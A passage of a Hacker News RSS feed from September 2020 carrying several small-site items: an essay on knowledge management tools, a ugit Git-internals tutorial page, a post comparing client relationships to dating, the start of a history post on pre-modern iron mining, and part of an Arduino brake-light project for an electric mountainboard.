level, </span> <em>personal knowledge graphs</em> <span> can have many interesting use cases for retrieval and automation. Tools like </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span>, </span> <a href="https://coda.io/" target="_blank"><span>Coda</span></a> <span>, and </span> <a href="https://roamresearch.com/" target="_blank"><span>Roam Research</span></a> <span> offer more options for structuring knowledge for individual users. But this is just the beginning.</span></p>  <p><h3><span>Autosuggest for Thoughts</span></h3></p> <p><span>With richer representations of knowledge, machines can better "understand" our thoughts and compute on them. This can help streamline (or even automate) much of the research and idea generation workflows. </span></p> <p><span>Imagine this: when you are writing about a topic, your knowledge base can suggest semantically relevant content, either from your existing data, your team, or the collective knowledge on the web. You would no longer have to switch contexts to look up simple facts. Rather, thoughts can flow frictionlessly from inside your head to external digital artifacts that you can edit and share.</span></p> <p><span>And with generative language models (such as the </span> <a href="https://openai.com/blog/openai-api/" target="_blank"><span>GPT</span></a> <span>) maturing, you can provide a skeletal structure of your ideas, and have AI models complete your thoughts. Instead of guessing and generating random tokens, the model's outputs would be based on your thoughts that have already been digitized in your system.  </span></p> <p><span>With this close collaboration with machines in your knowledge work, information becomes truly at your fingertips.</span></p>  <p><h3><span>Prefer simple over complex</span></h3></p> <p><span>Complexity can creep in any system. Technology tools tend to get bloated over time. An initially focused feature set can turn into a maze of confusing and loosely related features. A constant challenge for feature-rich tools is discoverability of functionalities without cluttering the UI. These tools are supposed to save you time. It would defeat the purpose of using the tool if it takes longer to make it work the way you want than to work without it. </span></p> <p><span>To this end, </span> <a href="https://www.notion.so/" target="_blank"><span>Notion</span></a> <span> has raised the bar for simplicity for knowledge management tools. </span> <a href="https://www.figma.com/" target="_blank"><span>Figma</span></a> <span> also does a good job for hiding its rich feature set behind contextual actions.</span></p>  <p><h3><span>Shared, Collaborative Knowledge Structures</span></h3></p> <p><span>Knowledge synthesis is collaborative by nature. You consume works created by others and in turn create yours by mixing in your knowledge and experience. Knowledge management systems can accelerate this collaboration and empower every individual to leverage and build on each other's work as much as possible.</span></p> <p><span>Instead of knowledge being siloed within disciplines and locked inside individuals' minds, there is tremendous potential for tools to enable individuals to contribute to a collective knowledge structure, while saving time from having to build their own from scratch. The successes of platforms such as Wikipedia and open source software development are encouraging. We can build towards a future where individuals expose and attach parts of their private knowledge base to a public topic entity for others to fork for their own use. And this process can even be automated at some point.</span></p>  <p><span>We live in an exciting time for content creators and for innovation in the knowledge management space. The above are some of the promising directions for development, to work towards accelerating learning, making new discoveries, and making progress towards solving big problems.</span></p> <p><span>To contribute to this vision, I recently open sourced an extensible </span> <a href="https://github.com/jhlyeung/rumin-web-clipper" target="_blank"><span>web clipper browser extension</span></a> <span>, and I am working towards a few of the directions outlined above with </span> <a href="https://getrumin.com/" target="_blank"><span>Rumin</span></a> <span>. If you would like to chat about this further, feel free to </span> <a href="https://twitter.com/jhlyeung" target="_blank"><span>get in touch on Twitter</span></a> <span>.</span></p>        


          
            
            <p><em>Each week, I send out a newsletter where I share my learnings, new ways to see things, and new ways to feel.</em></p>
            <p><em>Enter your email below to subscribe.</em></p>

            
          
        </div></div>]]>
            </description>
            <link>https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518086</guid>
            <pubDate>Fri, 18 Sep 2020 15:34:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: ugit ‚Äì Learn Git Internals by Building Git in Python]]>
            </title>
            <description>
<![CDATA[
Score 288 | Comments 29 (<a href="https://news.ycombinator.com/item?id=24517925">thread link</a>) | @nikital
<br/>
September 18, 2020 | https://www.leshenko.net/p/ugit/ | <a href="https://web.archive.org/web/*/https://www.leshenko.net/p/ugit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <p>Loading...</p>
    <section>
        
        
        
    </section>

    <section>
        
        
        <details>
            <summary>Download</summary>
            <p><span>Clone Œºgit using:</span>
                <span id="clone-cmd"></span>
                

                <span>Checkout this commit:</span>
                <span id="checkout-cmd"></span>
                
            </p>
        </details>
    </section>

    

    

    

    


</div>]]>
            </description>
            <link>https://www.leshenko.net/p/ugit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517925</guid>
            <pubDate>Fri, 18 Sep 2020 15:22:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dating Our Clients]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517907">thread link</a>) | @mcrittenden
<br/>
September 18, 2020 | https://critter.blog/2020/09/18/dating-our-clients/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/18/dating-our-clients/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-1408">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Client relationships have a lot in common with romantic relationships. This is <a href="https://creative-boost.com/client-relationships-are-like-dating/">well</a> <a href="https://www.leightoninteractive.com/blog/how-a-client-relationship-is-like-dating">documented</a> <a href="https://www.birdseed.io/business-customer-relationship-lot-like-dating/">elsewhere</a>. </p>



<p>Let‚Äôs start with the obvious parallels:</p>



<ul><li><em>Flirting and courting</em> = the sales process and trying to win the bid</li><li><em>Facebook official</em> = signing the contract</li><li><em>The honeymoon phase</em> = the first couple sprints when everything is still exciting and new</li><li><em>The first fight</em> = the first disagreement (often about scope)</li><li><em>The messy breakup </em>= using the termination clause in the contract</li><li><em>The amicable breakup </em>= a successful completion of the project</li><li><em>The messy divorce </em>= someone gets sued</li><li><em>The long term relationship = </em>a trusting partnership with no end date (this is the holy grail for many people, but not all)</li></ul>



<p>‚Äú<em>But romantic relationships are about love! Client relationships are about money! That is an important difference!</em>‚Äù That‚Äôs why I didn‚Äôt say that client relationships are <em>exactly </em>like romantic ones. But to be fair, aren‚Äôt both love and money about mutual benefit?</p>



<p>I could keep going and start talking about where kids and joint mortgages fit in, but it all gets very boring.</p>



<p>It‚Äôs more interesting when we apply the power dynamics of romantic relationships. Esther Perel, a well known psychotherapist and speaker, was <a href="https://tim.blog/2017/05/21/esther-perel/">on the Tim Ferriss podcast</a> a few years back. She said something that stuck with me enough to motivate me to spend 15 minutes finding the exact quote:</p>



<blockquote><p>In every couple you will often find one person who is more in touch with the <em>fear of losing the other</em>, and one person who is more in touch with the <em>fear of losing themselves</em>. </p><p>One person more in touch with the <em>fear of abandonment</em>, and one person more in touch with the <em>fear of suffocation</em>.</p><cite>Esther Perel (<a href="https://tim.blog/2018/06/01/the-tim-ferriss-show-transcripts-esther-perel/#:~:text=Every%20couple%20has%20a%20setup.%20It%E2%80%99s%20an%20organization.%20In%20every%20couple%20you%20will%20often%20find%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20the%20other%2C%20and%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20themselves.%20One%20person%20more%20in%20touch%20with%20the%20fear%20of%20abandonment%2C%20and%20one%20person%20more%20in%20touch%20with%20the%20fear%20of%20suffocation">transcript here</a>)</cite></blockquote>



<p>Are client relationships like that? I think so. It could go either way:</p>



<ul><li>The client is afraid that the contractor whom they rely on will move onto a higher paying or more interesting client (<em>fear of abandonment</em>)</li><li>The contractor is afraid that continuing to work with their client will prevent them from growing and learning new things (<em>fear of suffocation</em>)</li></ul>



<p>Or, going the other way:</p>



<ul><li>The client is afraid that the contractor‚Äôs low quality work or outdated solutions will hold them back (<em>fear of suffocation</em>)</li><li>The contractor is afraid that the client will fire them and hire someone selling shiny new unproven technology (<em>fear of abandonment</em>)</li></ul>



<p>Does any of that sound familiar? It does to me.</p>



<p>Who holds the most power in those situations? Obviously we‚Äôd prefer that whatever side we‚Äôre on has the power. But ideally both sides would hold equal power, so neither side needs to act out of fear.</p>



<p>It sounds like a chicken/egg problem: do we equalize power by getting rid of fear, or do we get rid of fear by equalizing power? But that‚Äôs a false dichotomy. Those are both symptoms of the larger issue: we aren‚Äôt communicating. Fix the communication and we fix both symptoms of it.</p>



<p>In a romantic relationship, we‚Äôd want to talk about this stuff, right? Get it out in the open and have a mature, honest conversation. Maybe even see a relationship counselor. </p>



<p>So why not do that with our client? It goes back to my post ‚Äú<a href="https://critter.blog/2020/08/25/hide-a-problem-from-your-client-and-now-youve-got-2-problems/">Hide a problem from your client and now you‚Äôve got 2&nbsp;problems</a>‚Äú. If we‚Äôre feeling a fear of suffocation or abandonment, or we suspect that they are, why wouldn‚Äôt we bring it up and talk through it with them?</p>



<p>What do you think? <a href="https://twitter.com/mcrittenden">Tweet me</a>!</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/18/dating-our-clients/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517907</guid>
            <pubDate>Fri, 18 Sep 2020 15:20:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iron, How Did They Make It? Part I, Mining]]>
            </title>
            <description>
<![CDATA[
Score 259 | Comments 62 (<a href="https://news.ycombinator.com/item?id=24517792">thread link</a>) | @dddddaviddddd
<br/>
September 18, 2020 | https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  <strong>And I want to stress that broad framing</strong>: iron was made into more things than <em>just</em> swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman‚Äôs hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.</p>



<p>Iron production is a unique topic in one key way.  If the problem with <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>is that the popular understanding of the past (either historical or fantastical) renders them <a href="https://acoup.blog/2019/07/12/collections-the-lonely-city-part-i-the-ideal-city/">effectively invisible</a> ‚Äì as indeed, it tends to render <em>most</em> ancient forms of production invisible ‚Äì <strong>iron-working is tremendously visible, but in a series of motifs that are almost completely</strong> <em><strong>wrong</strong></em>.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn‚Äôt really even provide a firm basis for correction.  <strong>We are going to have to start over, from the beginning</strong>.</p>



<p><strong>So this first post is going to focus on mining</strong>.  Next week we‚Äôll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we‚Äôll look at the basic principles behind forging.  And finally in the last week, we‚Äôll ask what one might do if they wanted <em>steel</em> instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  <strong>Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.</strong></p>



<figure><img data-attachment-id="4507" data-permalink="https://acoup.blog/saam-1910-9-11_1/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg" data-orig-size="800,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="saam-1910.9.11_1" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" src="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg 800w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=768 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><a href="https://americanart.si.edu/artwork/iron-mine-port-henry-new-york-16373">Via the Smithsonian</a>, a painting of an iron mine by Homer Dodge Martin (c. 1862) at Port Henry, New York.  By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.</figcaption></figure>



<p><strong>As with farming, there is a regional and chronological caveat necessary here</strong>: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or ‚Äì more broadly ‚Äì on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am <em><strong>not </strong></em>going to cover in detail is <em>modern</em> steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to <em>remove</em> carbon, instead of processes to add carbon).</p>



<p>I should also note that this post is going to focus on <em>iron</em>-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>





<p><strong>Bibliography Note at the Outset</strong>: For the sake of keeping these posts readable, especially since I don‚Äôt have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim &amp; I. Ridge, <em>Iron for the Eagles: The Iron Industry of Roman Britain</em> (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, <em>The Art of Blacksmithing</em> (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, <em>Artifacts: An Introduction to Early Materials and Technology</em> (1989) is more diffuse, but still has some useful information on metal production.<br>There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, <em>Mining and Metallurgy in the Greek and Roman World</em> (1978); R.F. Tylecote, <em>The Early History of Metallurgy in Europe</em> (1987); R. Shepherd, <em>Ancient Mining</em> (1993); P. Craddock, <em>Early Metal Mining and Production </em>(1995); V.F. Buchwald, <em>Iron and Steel in Ancient Times</em> (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, ‚ÄúMining and Metallurgy in medieval Civilisation‚Äù in <em>The Cambridge Economic History</em> <em>of Europe</em>, <em>volume 2: Trade and Industry in the Middle Ages</em>, 2nd. ed. (1987): 691-761.<br>For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, <em>Roman Imperial Armour: The Production of Early Imperial Military Armour</em> (2012) for the Roman period and A. Williams, <em>The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages &amp; the early modern period</em> (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, <em>The Field and the Forge: Population, Production and Power in the Pre-Industrial West</em> (2003) is a peerless starting point.<br>On the value and trade in metals in the ancient world, of particular note are M. Treister, <em>The Role of Metals in Ancient Greek History</em> (1996) and L. Bray, ‚Äú‚ÄòHorrible, Speculative, Nasty, Dangerous‚Äô: Assessing the Value of Roman Iron,‚Äù <em>Britannia</em> 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.</p>



<h2>Iron Ores</h2>



<p>In most video games, if you are looking to produce some iron things, the first problem you invariably have is <em>finding some iron</em> <em>ores</em>.  Often iron is some sort of<a href="https://civilization.fandom.com/wiki/Iron_(Civ4)"> semi-rare strategic resource</a> available in <a href="https://anno1800.fandom.com/wiki/Iron_Mine">only certain parts of the map</a>, something that factions might fight over.  Actually finding some iron might be a serious problem.</p>



<p>Well, I have good news for <em>historical</em> you as compared to <em>video game</em> you: iron is the fourth most common <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust#cite_note-7">element in earth‚Äôs crust</a>, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces ‚Äì and I mean this very literally ‚Äì a <em>billion tons</em> (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  <strong>And that‚Äôs the point</strong>.</p>



<p>One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just <em>so damn abundant</em>.  Of course iron can be used to make <em>better</em> tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was <em>cheap</em>.  Now, as we‚Äôll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that‚Äôs why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We‚Äôll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that <em>cast</em> iron is functionally useless.  <strong>But let‚Äôs get back to those sources of iron</strong>.</p>



<p>Very small amounts of iron occur on earth as pure ‚Äònative‚Äô metal; the term for this, ‚Äú<a href="https://en.wikipedia.org/wiki/Meteoric_iron">meteoric iron</a>‚Äù is an accurate description of where it comes from (there is also one known deposit of native ‚Äò<a href="https://en.wikipedia.org/wiki/Telluric_iron">telluric iron</a>‚Äò); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‚Äòpure‚Äô iron may be disregarded as a meaningful source of iron.</p>



<figure><img data-attachment-id="4509" data-permalink="https://acoup.blog/hematite_streak_plate/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg" data-orig-size="1280,547" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon PowerShot SX710 HS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1451453273&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.5&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.008&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="hematite_streak_plate" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Hematite">Via Wikipedia</a>, Hematite, leaving its characteristic red-rust streak.  The hematite on the left has a metallic lustre, whereas the hematite on the right has the (more common) earthy lustre.</figcaption></figure>



<p><strong>Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal</strong>.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe<sub>2</sub>O<sub>3</sub>), with goethite (HFeO<sub>2</sub>) and limonite (FeO(OH)¬∑<em>n</em>H<sub>2</sub>O) close behind.  Rarer, but still used was ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517792</guid>
            <pubDate>Fri, 18 Sep 2020 15:13:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Evening Project: Arduino based brake light controller for Electric Mountainboard]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517767">thread link</a>) | @gcds
<br/>
September 18, 2020 | https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: Arduino based brake light controller for VESC based Electric Mountainboard">
            </figure>

            <section>
                <div>
                    <p>I had a small request from my father to help him develop a small firmware for Arduino to control brake LED light for his electric mountain board, integrating with VESC to receive remote controller UART packets.</p><h2 id="some-explanations">Some explanations</h2><p>I know some of you have not heard Arduino, VESC, Electric Mountainboard, and similar terms.</p><h3 id="arduino">Arduino</h3><p><a href="https://www.arduino.cc/">Arduino</a> is an open-source hardware and software project and user community that designs and manufactures single-board microcontrollers and microcontroller kits for building digital devices.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-71.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-71.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-71.png 1000w, https://www.techprowd.com/content/images/2020/09/image-71.png 1020w" sizes="(min-width: 720px) 720px"></figure><p>In this project, our target will be the Arduino Pro Micro board based on the <a href="https://www.microchip.com/wwwproducts/en/ATmega32u4">ATMega32U4</a> processor featuring 32 KB self-programming flash program memory, 2.5 KB SRAM, 1 KB EEPROM, USB 2.0 full-speed/low-speed device, 12-channel 10-bit A/D-converter, and JTAG interface for on-chip-debug. The device achieves up to 16 MIPS throughput at 16 MHz. 2.7-5.5 volt operation.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-72.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-72.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-72.png 1000w, https://www.techprowd.com/content/images/2020/09/image-72.png 1032w" sizes="(min-width: 720px) 720px"></figure><h3 id="vesc">VESC</h3><p>The <a href="https://vesc-project.com/">VESC</a> (which stands for Vedder Electronic Speed Controller) is a more advanced ESC that allows for better motor and battery protection, regenerative braking, and programming options like acceleration-deceleration curves and other advanced features.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-73.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-73.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-73.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-73.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-73.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>It is an open-source ESC project and has many hardware projects based on its firmware.</p><h3 id="electric-mountainboard">Electric Mountainboard</h3><p>The Electric mountainboard, in simple terms, is an electrified mountainboard.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg" width="4032" height="2877" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div><div><p><img src="https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg" width="768" height="1024" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 768w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>Mountainboarding, also known as Dirtboarding, Offroad Boarding, and All-Terrain Boarding (ATB), is a well established[1] if little-known action sport, derived from snowboarding. This was initially pioneered by James Stanley during a visit in the 1900s to the Matterhorn where snow was not available. A mountainboard is made up of components including a deck, bindings to secure the rider to the deck, four wheels with pneumatic tires, and two steering mechanisms known as trucks. Mountainboarders, also known as riders, ride specifically designed boardercross tracks, slopestyle parks, grass hills, woodlands, gravel tracks, streets, skateparks, ski resorts, BMX courses, and mountain bike trails. It is this ability to ride such a variety of terrain that makes mountainboarding different from other board sports.</p><h2 id="remote-controller">Remote Controller</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-77.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-77.png 600w, https://www.techprowd.com/content/images/2020/09/image-77.png 768w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-leading-subject-the-brake-light">The leading subject the Brake Light</h2><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.18.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.18.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.13.jpg 600w, 